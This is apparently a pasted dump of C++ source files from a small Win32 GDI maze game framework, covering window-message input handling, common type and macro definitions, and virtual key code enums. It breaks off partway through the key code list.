    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  },
};





/******************************************************************************/





#define MAP_MAX 81
s32 map[MAP_MAX*MAP_MAX];
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\win32\_WindowProc.hpp"":
#ifndef _WIN32__WINDOWPROC_HPP
#define _WIN32__WINDOWPROC_HPP

#include <win32/video.hpp>
#include <win32/input.hpp>

#include <windowsx.h>

#include <public_stuff.hpp>



//assumes window is without a menu
static inline Point2d CalculateWindowSize(u32 innerWidth, u32 innerHeight,
                                          u32 flags,      u32 flagsEx)
{
  RECT winSize;
  winSize.left   = 0;
  winSize.top    = 0;
  winSize.right  = innerWidth;
  winSize.bottom = innerHeight;
  AdjustWindowRectEx(&winSize, flags, false, flagsEx);

  Point2d winSizeAdjusted;
  winSizeAdjusted.x = winSize.right  - winSize.left;
  winSizeAdjusted.y = winSize.bottom - winSize.top;
  return winSizeAdjusted;

}



static inline Rect2d ConvertToKitRect(RECT& rectIn){
  Rect2d rectOut;
  rectOut.x = rectIn.left;
  rectOut.y = rectIn.top;
  rectOut.w = rectIn.right  - rectIn.left;
  rectOut.h = rectIn.bottom - rectIn.top;

  return rectOut;

}



static inline RECT ConvertFromKitRect(Rect2d& rectIn){
  RECT rectOut;
  rectOut.left   = rectIn.x;
  rectOut.top    = rectIn.y;
  rectOut.right  = rectIn.x + rectIn.w;
  rectOut.bottom = rectIn.y + rectIn.h;

  return rectOut;

}





union KEY_Params {
  struct {
    u32 repeatCount   : 16; // 0 -> 15
    u32 scanCode      :  8; //16 -> 23
    u32 extendedKey   :  1; //24
    u32 _reserved     :  4; //25 -> 28
    u32 altKeyDown    :  1; //29
    u32 prevUnpressed :  1; //30
    u32 currUnpressed :  1; //31
  };

  u32 value;

  KEY_Params(u32 _value) : value(_value) {}

};



// This event handler is used for KEY_CHAR, KEY_UP, and KEY_DOWN events
static inline void HANDLE_KEY_CHARUPDOWN(Event& event,
                                         bool charEvent,u8 virtualKeyCode,
                                         KEY_Params& params, u16 kmods)
{
  if(charEvent){
    event.type = EVENT_KEY_CHAR;
  } else {
    if(params.currUnpressed) event.type = EVENT_KEY_UP;
    else                     event.type = EVENT_KEY_DOWN;
  }

  event.key.kmods = kmods;

  event.key.pkey = params.scanCode;
  event.key.vkey = virtualKeyCode;

  event.key.pressed = !params.currUnpressed;
  event.key.repeat  = params.repeatCount>0; //modified to act as a boolean
  event.key.ischar  = charEvent;

}





union MOUSE_ButtonStates {
  // The positions of these bits are the same as
  // the bitmasks in Event_Mouse_ButtonEnum
  struct {
    u8  left   : 1;
    u8  middle : 1;
    u8  right  : 1;
    u8  x1     : 1;
    u8  x2     : 1;
    u8  ctrl   : 1; // 'Is the control key currently pressed?'
    u8  shift  : 1; // 'Is the shift key currently pressed?'
    u8 _unused : 1;
  };

  u8 value;

  MOUSE_ButtonStates() : value(0) {}
  MOUSE_ButtonStates(u8 _value) : value(_value) {}

};



extern Point2d win_size;
extern MOUSE_ButtonStates mbutton_states;

// Converts window coords to canvas coords
static inline void ConvertCoordinates(f32& x, f32& y){
  x = (x/(win_size.x-1)) * ((f32)CANVAS_W-1.0f);
  y = (y/(win_size.y-1)) * ((f32)CANVAS_H-1.0f);

}



static inline void HANDLE_MOUSE_MOVED(Event& event, u8 buttonStates,
                                      Point2d& previous, Point2d& current)
{
  event.type = EVENT_MOUSE_MOVED;

  event.mouse.x = current.x;
  event.mouse.y = current.y;
  ConvertCoordinates(event.mouse.x, event.mouse.y);


  Fpoint2d _previous = { (f32)previous.x, (f32)previous.y };
  Fpoint2d _current = { (f32)current.x, (f32)current.y };

  ConvertCoordinates(_previous.x, _previous.y);
  ConvertCoordinates(_current.x, _current.y);

  event.mouse.dx = _current.x - _previous.x;
  event.mouse.dy = _current.y - _previous.y;


  event.mouse.button  = buttonStates;
  event.mouse.pressed = buttonStates!=0;

}



// Same event handler is used for both MOUSE_HWHEEL and MOUSE_VWHEEL events
static inline void HANDLE_MOUSE_HVWHEEL(Event& event,
                                        bool verticalScroll, s16 scrollAmount,
                                        u8 buttonStates, Point2d& mousePos)
{
  if(verticalScroll){
    event.type = EVENT_MOUSE_VWHEEL;
    event.mouse.dy = (f32)scrollAmount/WHEEL_DELTA;
  } else {
    event.type = EVENT_MOUSE_HWHEEL;
    event.mouse.dx = (f32)scrollAmount/WHEEL_DELTA;
  }

  event.mouse.x = mousePos.x;
  event.mouse.y = mousePos.y;
  ConvertCoordinates(event.mouse.x, event.mouse.y);

  event.mouse.button  = buttonStates;
  event.mouse.pressed = buttonStates!=0;

}



// Same event handler is used for both MOUSE_UP and MOUSE_DOWN events
static inline void HANDLE_MOUSE_UPDOWN(Event& event, Point2d& clickPosition,
                                       u8 buttonStates, bool pressed, bool doubleClick)
{
  if(pressed) event.type = EVENT_MOUSE_DOWN;
  else        event.type = EVENT_MOUSE_UP;

  event.mouse.x = clickPosition.x;
  event.mouse.y = clickPosition.y;
  ConvertCoordinates(event.mouse.x, event.mouse.y);

  event.mouse.button   = buttonStates;
  event.mouse.pressed  = pressed;
  event.mouse.dblClick = doubleClick;

}



static void add_event(Event& evt);

// flag_which must be one of the ""DOWN"" flags (Ex.: RI_MOUSE_BUTTON_1_DOWN)
// (Also, timestamp is assumed to have already been set inside evt!)
static void send_raw_mbutton_press(Event& evt, u16 flags,
                                   u16 flag_which, u8 button_which);



// This doesn't handle a single mouse event,
// but rather all of the mouse events when the cursor is trapped
static inline void HANDLE_MOUSE_RAWINPUT(Event& evt,
                                         u16 flags, f32 deltaWheel,
                                         f32 deltaX, f32 deltaY)
{
  QueryPerformanceCounter((LARGE_INTEGER*)&evt.common.timestamp);



  evt.mouse.button = mbutton_states.value;

  send_raw_mbutton_press(evt, flags, RI_MOUSE_BUTTON_1_DOWN, MBUTTON_LEFT  );
  send_raw_mbutton_press(evt, flags, RI_MOUSE_BUTTON_2_DOWN, MBUTTON_MIDDLE);
  send_raw_mbutton_press(evt, flags, RI_MOUSE_BUTTON_3_DOWN, MBUTTON_RIGHT );
  send_raw_mbutton_press(evt, flags, RI_MOUSE_BUTTON_4_DOWN, MBUTTON_X1    );
  send_raw_mbutton_press(evt, flags, RI_MOUSE_BUTTON_5_DOWN, MBUTTON_X2    );

  evt.mouse.pressed = evt.mouse.button!=0;



  if(flags&RI_MOUSE_WHEEL){
    evt.type = EVENT_MOUSE_VWHEEL;
    evt.mouse.dy = deltaWheel;
    _add_event_func: add_event(evt);

  } else if(flags&RI_MOUSE_HWHEEL){
    evt.type = EVENT_MOUSE_HWHEEL;
    evt.mouse.dx = deltaWheel;
    goto _add_event_func;

  }



  if(deltaX != 0.0f  ||  deltaY != 0.0f){
    evt.type = EVENT_MOUSE_MOVED;
    evt.mouse.dx = deltaX;
    evt.mouse.dy = deltaY;
    add_event(evt);

  }

}



#endif /* _WIN32__WINDOWPROC_HPP */
"
QUmNuKFv,work for 2025-04-25 (4/5),Kitomas,C++,Friday 25th of April 2025 05:02:00 AM CDT,"/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\include\public_stuff.hpp"":
#ifndef _PUBLIC_STUFF_HPP
#define _PUBLIC_STUFF_HPP





// Comment out any misc. functions you don't plan on using
//#define PRINT_EVENT_USED
#define FRAND_USED // (Includes all types of frand)

// Comment out any draw functions you don't plan on using
#define UNPACK_FONT_USED
#define DRAW_TEXT_USED
#define _DRAW_TEXTF_USED // Formatted text variant (implies DRAW_TEXT_USED)
#define BLIT_USED
#define DRAW_LINE_USED
#define DRAW_RECT_USED
#define FILL_RECT_USED
#define DRAW_VSLICE_USED

#define FONT_PICO8_USED // (Implies UNPACK_FONT_USED)

#define SOUND_STUFF_USED // 'Use the built-in sound effect mixer?'





// Comment this line out if you don't plan on using stdlib's implementations of:
// memset
// memcpy
// strnlen
// strncpy
// strcat
// strncmp
#define STDLIB_USED

#if defined(FRAND_USED) && !defined(STDLIB_USED)
  #define STDLIB_USED
#endif

#if defined(FONT_PICO8_USED) && !defined(UNPACK_FONT_USED)
  #define UNPACK_FONT_USED
#endif

#if defined(_DRAW_TEXTF_USED) && !defined(DRAW_TEXT_USED)
  #define DRAW_TEXT_USED
#endif



#ifdef STDLIB_USED
  #include <string.h>
  #include <math.h>
  // The framework uses its own implementations for the following stdlib
  // functions so that it doesn't require the C runtime libraries.
  // However, if the user plans on using the standard library for their
  // own purposes, having custom implementations would be redundant
  #define memSet  memset
  #define memCpy  memcpy
  #define strnLen strnlen
  #define strnCpy strncpy
  #define strCat  strcat
  #define strnCmp strncmp
  // (sinF is only used for the example audio usage,
  //  and that's commented out at first anyway!)
  #define sinF    sinf
#endif /* STDLIB_USED */



// If you don't end up using anything else from stdio,
// using this makes sure printf is only included in the debug build!
// This is useful for minimizing size, since the command line is
// only shown in the debug build anyway.
#ifdef _DEBUG
  #include <stdio.h>
  #define _printf(...) printf(__VA_ARGS__)
#else
  #define _printf(...)
#endif /* _DEBUG */





// Float-specified versions of math.h's pi constants,
// with a slightly different naming convention

#ifndef   M_PI4f
#define   M_PI4f 0.7853981633974483096156608f
#endif /* M_PI2 */

#ifndef   M_PI2f
#define   M_PI2f 1.5707963267948966192313216f
#endif /* M_PI2 */

#ifndef   M_PIf
#define   M_PIf  3.1415926535897932384626433f
#endif /* M_PIf */

#ifndef   M_2PIf
#define   M_2PIf 6.2831853071795864769252866f
#endif /* M_2PIf */





#ifndef   MIN
#define   MIN(a,b)  ( ((a)<(b)) ? (a) : (b) )
#endif /* MIN(a,b) */

#ifndef   MAX
#define   MAX(a,b)  ( ((a)>(b)) ? (a) : (b) )
#endif /* MAX(a,b) */

#ifndef   MIN3
#define   MIN3(_a, _b, _c) MIN(MIN(_a, _b), _c)
#endif /* MIN3 */

#ifndef   MAX3
#define   MAX3(_a, _b, _c) MAX(MAX(_a, _b), _c)
#endif /* MAX3 */

#ifndef   CLAMP
#define   CLAMP(n, mn, mx)  MIN(MAX(n,mn),mx)
#endif /* CLAMP(n, mn, mx) */

// Precise version of linear interpolation
#ifndef   LERP
#define   LERP(_v0, _v1, _t)  (  (1.0-(_t)) * (_v0)  +  (_t) * (_v1)  )
#endif /* LERP */

// Imprecise (but theoretically faster) version
#ifndef   LERP2
#define   LERP2(_v0, _v1, _t)  ( (_v0) + (_t) * ((_v1)-(_v0))  )
#endif /* LERP2 */

#ifndef   IN_BOUNDS
#define   IN_BOUNDS(_x, _y) (  (_x) >= 0  &&  (_x) < CANVAS_W  && \
                               (_y) >= 0  &&  (_y) < CANVAS_H  )
#endif /* IN_BOUNDS */

// For printing the results of a boolean value.
// To use this, use the ""%s"" format specifier,
// with this as the parameter
#ifndef   BOOL_STR
#define   BOOL_STR(_is_true) ( (_is_true) ? ""true"" : ""false"" )
#endif /* BOOL_STR */





#ifdef __cplusplus
  #include <cstddef>
  #include <cstdint>
  #include <climits>
#else
  #include <stdint.h>
#endif /* __cplusplus */

typedef uint8_t  u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t  s8;
typedef int16_t s16;
typedef int32_t s32;
typedef int64_t s64;

typedef float  f32;
typedef double f64;





// There's no real point in messing with this stuff
// unless you know how they're useful.
// Relevant documentation if you want to know how to use these:
// PACKED       : https://gcc.gnu.org/onlinedocs/gcc-14.2.0/gcc/Common-Variable-Attributes.html#index-packed-variable-attribute
// NOINLINE     : https://gcc.gnu.org/onlinedocs/gcc-14.2.0/gcc/Common-Function-Attributes.html#index-noinline-function-attribute
// DEPRECATED   : https://gcc.gnu.org/onlinedocs/gcc-14.2.0/gcc/Common-Function-Attributes.html#index-deprecated-function-attribute
// FALLTHROUGH  : https://gcc.gnu.org/onlinedocs/gcc-14.2.0/gcc/Statement-Attributes.html#index-fallthrough-statement-attribute
// ALWAYS_INLINE: https://gcc.gnu.org/onlinedocs/gcc-14.2.0/gcc/Common-Function-Attributes.html#index-always_005finline-function-attribute
#if defined(__GNUC__)
  #define ATTR_PACKED        __attribute__((packed))
  #define ATTR_NOINLINE      __attribute__((noinline))
  #define ATTR_DEPRECATED    __attribute__((deprecated))
  #define ATTR_FALLTHROUGH   __attribute__((fallthrough))
  #define ATTR_ALWAYS_INLINE __attribute__((always_inline))
#endif





/************************************ MISC ************************************/

struct Fpoint2d { f32 x, y; };
struct Fpoint3d { f32 x, y, z; };

struct Point2d  { s32 x, y; };
struct Point3d  { s32 x, y, z; };

struct Rect2d   { s32 x, y, w, h; };



// These are custom implementations for necessary functions.
// They're only included if the std library isn't used,
// since the framework has to use them for some things.

#ifndef STDLIB_USED

void* memSet(void* dst, int val, size_t len);

//(len_max does not include null-terminator!)
//(if !len_max, call is analogous to str(not n)len)
size_t strnLen(const char* str, size_t len_max);

char* strnCpy(char* str_dst, const char* str_src, size_t len_max);

char* strCat(char* dst, const char* src);

//(len_max does not include null-terminator!)
//(if !len_max, call is analogous to str(not n)cmp)
s32 strnCmp(const char* str_a, const char* str_b, size_t len_max);

f32 sinF(f32 x);
#define cosF(_x) sinF((_x)+M_PI2f)
#define tanF(_x) ( sinF(_x)/cosF(_x) )

#endif



enum MessageBoxEnum {
  // Return values
  MSGBOX_RTN_NULL     = 0x00000000, //showMessageBox failed
  MSGBOX_RTN_OK       = 0x00000001, //'ok' button was clicked
  MSGBOX_RTN_CANCEL   = 0x00000002, //'cancel' button was clicked
  MSGBOX_RTN_ABORT    = 0x00000003, //'abort' button was clicked
  MSGBOX_RTN_RETRY    = 0x00000004, //'retry' button was clicked
  MSGBOX_RTN_IGNORE   = 0x00000005, //'ignore' button was clicked
  MSGBOX_RTN_YES      = 0x00000006, //'yes' button was clicked
  MSGBOX_RTN_NO       = 0x00000007, //'no' button was clicked
  MSGBOX_RTN_TRYAGAIN = 0x0000000A, //'try again' button was clicked
  MSGBOX_RTN_CONTINUE = 0x0000000B, //'continue' button was clicked

  // Button types
  MSGBOX_BTN_OK                = 0x00000000,
  MSGBOX_BTN_OKCANCEL          = 0x00000001,
  MSGBOX_BTN_ABORTRETRYIGNORE  = 0x00000002,
  MSGBOX_BTN_YESNOCANCEL       = 0x00000003,
  MSGBOX_BTN_YESNO             = 0x00000004,
  MSGBOX_BTN_RETRYCANCEL       = 0x00000005,
  MSGBOX_BTN_CANCELTRYCONTINUE = 0x00000006,

  // Icon types
  MSGBOX_ICN_ERROR    = 0x000000010,
  MSGBOX_ICN_QUESTION = 0x000000020, //apparently deprecated, but still supported
  MSGBOX_ICN_WARNING  = 0x000000030,
  MSGBOX_ICN_INFO     = 0x000000040,

};

u32 showMessageBox(const char* text = nullptr, const char* title = nullptr,
                   u32 type = MSGBOX_BTN_OK|MSGBOX_ICN_INFO,
                   u32 defaultButton = 0);

u64 timeGetPerfCounter();
u64 timeGetPerfFreq();
f64 timeGetSeconds();

void timeSleep(u32 milliseconds);



#ifdef PRINT_EVENT_USED
#ifdef _DEBUG
  union Event; // Forward declaration
  void print_event(Event& evt);
#else
  #define print_event(_evt) {}
#endif /* _DEBUG */
#endif /* PRINT_EVENT_USED */



// Warning: this doesn't check if buffer is not nullptr,
// nor does it check if which_bit is inside buffer!
bool is_bit_set(const void* buffer, u32 which_bit);



#ifdef FRAND_USED
f64 frand();   // 0.0f -> 1.0f
f64 frand2();  //-1.0f -> 1.0f
f32 frandf();  // 0.0f -> 1.0f
f32 frandf2(); //-1.0f -> 1.0f
#endif /* FRAND_USED */



/* taken from stb_sprintf.h (what these 2 functions use under-the-hood):

64-BIT INTS:
============
This library also supports 64-bit integers and you can use MSVC style or
GCC style indicators (%I64d or %lld).  It supports the C99 specifiers
for size_t and ptr_diff_t (%jd %zd) as well.

EXTRAS:
=======
Like some GCCs, for integers and floats, you can use a ' (single quote)
specifier and commas will be inserted on the thousands: ""%'d"" on 12345
would print 12,345.

For integers and floats, you can use a ""$"" specifier and the number
will be converted to float and then divided to get kilo, mega, giga or
tera and then printed, so ""%$d"" 1000 is ""1.0 k"", ""%$.2d"" 2536000 is
""2.53 M"", etc. For byte values, use two $:s, like ""%$$d"" to turn
2536000 to ""2.42 Mi"". If you prefer JEDEC suffixes to SI ones, use three
$:s: ""%$$$d"" -> ""2.42 M"". To remove the space between the number and the
suffix, add ""_"" specifier: ""%_$d"" -> ""2.53M"".

In addition to octal and hexadecimal conversions, you can print
integers in binary: ""%b"" for 256 would print 100.

PERFORMANCE vs MSVC 2008 32-/64-bit (GCC is even slower than MSVC):
===================================================================
""%d"" across all 32-bit ints (4.8x/4.0x faster than 32-/64-bit MSVC)
""%24d"" across all 32-bit ints (4.5x/4.2x faster)
""%x"" across all 32-bit ints (4.5x/3.8x faster)
""%08x"" across all 32-bit ints (4.3x/3.8x faster)
""%f"" across e-10 to e+10 floats (7.3x/6.0x faster)
""%e"" across e-10 to e+10 floats (8.1x/6.0x faster)
""%g"" across e-10 to e+10 floats (10.0x/7.1x faster)
""%f"" for values near e-300 (7.9x/6.5x faster)
""%f"" for values near e+300 (10.0x/9.1x faster)
""%e"" for values near e-300 (10.1x/7.0x faster)
""%e"" for values near e+300 (9.2x/6.0x faster)
""%.320f"" for values near e-300 (12.6x/11.2x faster)
""%a"" for random values (8.6x/4.3x faster)
""%I64d"" for 64-bits with 32-bit values (4.8x/3.4x faster)
""%I64d"" for 64-bits > 32-bit values (4.9x/5.5x faster)
""%s%s%s"" for 64 char strings (7.1x/7.3x faster)
""...512 char string..."" ( 35.0x/32.5x faster!)

*/

#define snprintf snPrintf
#define vsnprintf vsnPrintf
#include <stdarg.h>

//if len_max == 0 OR > INT_MAX, call is analogous to s(not n)printf
s32 snPrintf(char* str_dst, size_t len_max, const char* str_fmt, ...);

//^^ VV unlike normal snprintf, these'll always return a null-terminated string

//if len_max == 0 OR > INT_MAX, call is analogous to vs(not n)printf
s32 vsnPrintf(char* str_dst, size_t len_max, const char* str_fmt, va_list va);



// Use these instead of malloc, free, or realloc!
void* mem_alloc(size_t size);
void  mem_free(void* ptr_p); // ptr_p means: use &ptr instead of ptr
void* mem_realloc(void* ptr_p, size_t newSize); // ptr_p is the same as in free

size_t mem_getNumAllocations();
size_t mem_setNumAllocations(size_t value);
size_t mem_addNumAllocations(s32 amount);

void* mem_set(void* ptr, s32 value, size_t size);
void* mem_copy(void* destination, const void* source, size_t size);

struct mem_Wrapper {
  void* ptr = nullptr;

  inline mem_Wrapper(size_t size){ ptr = mem_alloc(size); }
  inline mem_Wrapper(void* _ptr) : ptr(_ptr) {} //existing mem_alloc
  inline ~mem_Wrapper(){ mem_free(&ptr); };

  inline void* realloc(size_t newSize){ return mem_realloc(&ptr, newSize); }

};





/*********************************** INPUT ************************************/

#define EVENT_ID(_id) ( (_id) & 0xFFFF0000 )
#define SUBEVENT_ID(_id) ( (_id) & 0xFFFF )

enum EventEnum {
  EVENT_NULL            = 0x00000000,

  EVENT_COMMON          = 0x00010000, // Event_Common (Event.common)

  // (Occurs when the window is destroyed!)
  EVENT_QUIT            = 0x00020000, // N/A (N/A)

  EVENT_KEY             = 0x00030000, // Event_Key (Event.key)
  EVENT_KEY_CHAR        = EVENT_KEY   | 0x0001,
  EVENT_KEY_UP          = EVENT_KEY   | 0x0002,
  EVENT_KEY_DOWN        = EVENT_KEY   | 0x0003,

  EVENT_MOUSE           = 0x00040000, // Event_Mouse (Event.mouse)
  EVENT_MOUSE_MOVED     = EVENT_MOUSE | 0x0001,
  EVENT_MOUSE_HWHEEL    = EVENT_MOUSE | 0x0002,
  EVENT_MOUSE_VWHEEL    = EVENT_MOUSE | 0x0003,
  EVENT_MOUSE_UP        = EVENT_MOUSE | 0x0004,
  EVENT_MOUSE_DOWN      = EVENT_MOUSE | 0x0005,

  // (Occurs once every time the cursor is trapped and released respectively!)
  EVENT_CURSOR          = 0x00050000, // N/A (N/A)
  EVENT_CURSOR_TRAPPED  = EVENT_CURSOR | 0x0001,
  EVENT_CURSOR_RELEASED = EVENT_CURSOR | 0x0002,

  EVENT_UNKNOWN         = 0xFFFF0000,

};



/*+EVENT_COMMON+*/

struct Event_Common { //16B
  u32  type;
  u32 _unused; // Unused by common, but not necessarily other event types
  u64  timestamp; // Performance counter is used; see ""timeGetPerfCounter()""
};

/*-EVENT_COMMON-*/



/*+EVENT_KEY+*/

// Event_Key.kmods can use any combination of these OR'd (AKA |) together
enum Event_Key_ModifierEnum { // (These are bitmasks)
  KMOD_NONE      = 0x0000,
  KMOD_LSHIFT    = 0x0001,
  KMOD_RSHIFT    = 0x0002,
  KMOD_LCTRL     = 0x0004,
  KMOD_RCTRL     = 0x0008,
  KMOD_LALT      = 0x0010,
  KMOD_RALT      = 0x0020,
  KMOD_LGUI      = 0x0040, // Windows key?
  KMOD_RGUI      = 0x0080,  //^^
    KMOD_LWIN    = KMOD_LGUI,
    KMOD_RWIN    = KMOD_RGUI,
  KMOD_NUMLOCK   = 0x1000,
  KMOD_CAPSLOCK  = 0x2000,
  KMOD_ALTGRAPH  = 0x4000,
  KMOD_SCROLLOCK = 0x8000,
  KMOD_CTRL      = ( KMOD_LCTRL  | KMOD_RCTRL  ),
  KMOD_SHIFT     = ( KMOD_LSHIFT | KMOD_RSHIFT ),
  KMOD_ALT       = ( KMOD_LALT   | KMOD_RALT   ),
  KMOD_GUI       = ( KMOD_LGUI   | KMOD_RGUI   ),
  KMOD_WIN       = ( KMOD_LWIN   | KMOD_RWIN   ),
};



enum Event_Key_PhysicalEnum {
  // TBD because I don't want to bother with scancode stuff right now
};



enum Event_Key_VirtualEnum {
  VKEY_NULL             = 0x00,
  //(misc. mouse)       = 0x01 -> 0x06
  //(reserved)          = 0x07,
  VKEY_BACK             = 0x08, //backspace key
    VKEY_BACKSPACE      = VKEY_BACK,
  VKEY_TAB              = 0x09,
  //(reserved)          = 0x0A -> 0x0B,
  VKEY_CLEAR            = 0x0C,
  VKEY_RETURN           = 0x0D, //enter key
    VKEY_ENTER          = VKEY_RETURN,
  //(unassigned)        = 0x0E -> 0x0F,
  VKEY_SHIFT            = 0x10,
  VKEY_CONTROL          = 0x11, //ctrl key
    VKEY_CTRL           = VKEY_CONTROL,
  VKEY_MENU             = 0x12, //alt key
    VKEY_ALT            = VKEY_MENU,
  VKEY_PAUSE            = 0x13,
  VKEY_CAPITAL          = 0x14, //caps lock key
    VKEY_CAPSLOCK       = VKEY_CAPITAL,
  //(IME stuff)         = 0x15 -> 0x1A,
  VKEY_ESCAPE           = 0x1B, //esc key
  //(IME stuff)         = 0x1C -> 0x1F,
  VKEY_SPACE            = 0x20, //space bar key
  VKEY_PRIOR            = 0x21, //page up key
    VKEY_PGUP           = VKEY_PRIOR,
  VKEY_NEXT             = 0x22, //page down key
    VKEY_PGDN           = VKEY_NEXT,
  VKEY_END              = 0x23,
  VKEY_HOME             = 0x24,
  VKEY_LEFT             = 0x25, //left arrow key
  VKEY_UP               = 0x26, //up arrow key
  VKEY_RIGHT            = 0x27, //right arrow key
  VKEY_DOWN             = 0x28, //down arrow key
  VKEY_SELECT           = 0x29,
  VKEY_PRINT            = 0x2A,
  VKEY_EXECUTE          = 0x2B,
  VKEY_SNAPSHOT         = 0x2C, //print screen key
    VKEY_PRTSC          = VKEY_SNAPSHOT,
  VKEY_INSERT           = 0x2D, //ins key
  VKEY_DELETE           = 0x2E, //del key
  VKEY_HELP             = 0x2F, //help key
  VKEY_0                = 0x30, //'0'
  VKEY_1                = 0x31, //'1'
  VKEY_2                = 0x32, //'2'
  VKEY_3                = 0x33, //'3'
  VKEY_4                = 0x34, //'4'
  VKEY_5                = 0x35, //'5'
  VKEY_6                = 0x36, //'6'
  VKEY_7                = 0x37, //'7'
  VKEY_8                = 0x38, //'8'
  VKEY_9                = 0x39, //'9'
  //(undefined)         = 0x3A -> 0x40,
  VKEY_A                = 0x41, //'A'
  VKEY_B                = 0x42, //'B'
  VKEY_C                = 0x43, //'C'
  VKEY_D                = 0x44, //'D'
  VKEY_E                = 0x45, //'E'
  VKEY_F                = 0x46, //'F'
  VKEY_G                = 0x47, //'G'
  VKEY_H                = 0x48, //'H'
  VKEY_I                = 0x49, //'I'
  VKEY_J                = 0x4A, //'J'
  VKEY_K                = 0x4B, //'K'
  VKEY_L                = 0x4C, //'L'
  VKEY_M                = 0x4D, //'M'
  VKEY_N                = 0x4E, //'N'
  VKEY_O                = 0x4F, //'O'
  VKEY_P                = 0x50, //'P'
  VKEY_Q                = 0x51, //'Q'
  VKEY_R                = 0x52, //'R'
  VKEY_S                = 0x53, //'S'
  VKEY_T                = 0x54, //'T'
  VKEY_U                = 0x55, //'U'
  VKEY_V                = 0x56, //'V'
  VKEY_W                = 0x57, //'W'
  VKEY_X                = 0x58, //'X'
  VKEY_Y                = 0x59, //'Y'
  VKEY_Z                = 0x5A, //'Z'
  VKEY_LWIN             = 0x5B, //left windows key
  VKEY_RWIN             = 0x5C, //right windows key
  VKEY_APPS             = 0x5D, //applications key
  //(reserved)          = 0x5E,
  VKEY_SLEEP            = 0x5F, //computer sleep key
  VKEY_NUMPAD0          = 0x60,
  VKEY_NUMPAD1          = 0x61,
  VKEY_NUMPAD2          = 0x62,
  VKEY_NUMPAD3          = 0x63,
  VKEY_NUMPAD4          = 0x64,
  VKEY_NUMPAD5          = 0x65,
  VKEY_NUMPAD6          = 0x66,
  VKEY_NUMPAD7          = 0x67,
  VKEY_NUMPAD8          = 0x68,
  VKEY_NUMPAD9          = 0x69,
  VKEY_MULTIPLY         = 0x6A, //numpad '*'
  VKEY_ADD              = 0x6B, //numpad '+'
  VKEY_SEPARATOR        = 0x6C, //numpad enter
  VKEY_SUBTRACT         = 0x6D, //numpad '-'
  VKEY_DECIMAL          = 0x6E, //numpad '.'
  VKEY_DIVIDE           = 0x6F, //numpad '/'
  VKEY_F1               = 0x70,
  VKEY_F2               = 0x71,
  VKEY_F3               = 0x72,
  VKEY_F4               = 0x73,
  VKEY_F5               = 0x74,
  VKEY_F6               = 0x75,
  VKEY_F7               = 0x76,
  VKEY_F8               = 0x77,
  VKEY_F9               = 0x78,
  VKEY_F10              = 0x79,
  VKEY_F11              = 0x7A,
  VKEY_F12              = 0x7B,
  VKEY_F13              = 0x7C,
  VKEY_F14              = 0x7D,
  VKEY_F15              = 0x7E,
  VKEY_F16              = 0x7F,
  VKEY_F17              = 0x80,
  VKEY_F18              = 0x81,
  VKEY_F19              = 0x82,
  VKEY_F20              = 0x83,
  VKEY_F21              = 0x84,
  VKEY_F22              = 0x85,
  VKEY_F23              = 0x86,
  VKEY_F24              = 0x87,
  //(reserved)          = 0x88 -> 0x8F,
  VKEY_NUMLOCK          = 0x90,
  VKEY_SCROLL           = 0x91, //scroll lock key
    VKEY_SCROLLOCK      = VKEY_SCROLL,
  //(OEM-specific)      = 0x92 -> 0x96,
  //(unassigned)        = 0x97 -> 0x9F,
  //(l/r key variants)  = 0xA0 -> 0xA5,
  //(browser keys)      = 0xA6 -> 0xAC,
  VKEY_VOLUME_MUTE      = 0xAD,
  VKEY_VOLUME_DOWN      = 0xAE,
  VKEY_VOLUME_UP        = 0xAF,
  VKEY_MEDIA_NEXT_TRACK = 0xB0,
  VKEY_MEDIA_PREV_TRACK = 0xB1,
  VKEY_MEDIA_STOP       = 0xB2,
  VKEY_MEDIA_PLAY_PAUSE = 0xB3, //Play/Pause Media key
  //(launch keys)       = 0xB4 -> 0xB7,
  //(reserved)          = 0xB8 -> 0xB9,
  VKEY_OEM_1            = 0xBA, //misc. chars; varies by keyboard (';',':' on US standard)
    VKEY_SEMICOLON      = VKEY_OEM_1,
  VKEY_OEM_PLUS         = 0xBB, //'+' in any country/region
    VKEY_PLUS           = VKEY_OEM_PLUS,
  VKEY_OEM_COMMA        = 0xBC, //',' in any country/region
    VKEY_COMMA          = VKEY_OEM_COMMA,
  VKEY_OEM_MINUS        = 0xBD, //'-' in any country/region
    VKEY_MINUS          = VKEY_OEM_MINUS,
  VKEY_OEM_PERIOD       = 0xBE, //'.' in any country/region
    VKEY_PERIOD         = VKEY_OEM_PERIOD,
  VKEY_OEM_2            = 0xBF, //misc. chars; varies by keyboard ('/','?' on US standard)
    VKEY_FSLASH         = VKEY_OEM_2,
  VKEY_OEM_3            = 0xC0, //misc. chars; varies by keyboard ('`','~' on US standard)
    VKEY_BACKTICK       = VKEY_OEM_3,
